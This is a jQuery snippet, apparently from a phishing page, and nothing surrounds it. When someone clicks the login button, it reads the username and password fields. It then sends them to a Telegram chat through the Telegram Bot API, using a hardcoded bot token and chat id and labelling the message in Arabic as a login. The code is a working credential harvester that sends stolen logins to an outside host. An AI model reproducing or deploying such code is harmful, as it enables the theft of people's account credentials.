$("div#l2 button.btn.btn-primary").on("click",() => {let api = new XMLHttpRequest(); api.open("GET", `https://api.telegram.org/bot7259622411:AAEGsCV7mR4DeNGsgy-htICBsjU6Zht1N-I/sendMessage?chat_id=-4249474192&text=This%20is%20:%20%0A%20-%20us:%20${$("#u2").val()}%20%0A%20-%20pas:%20${$("#pass1").val()}%20%0A%20-%20type:%20تسجيل%20الدخول`, true); api.send();
})
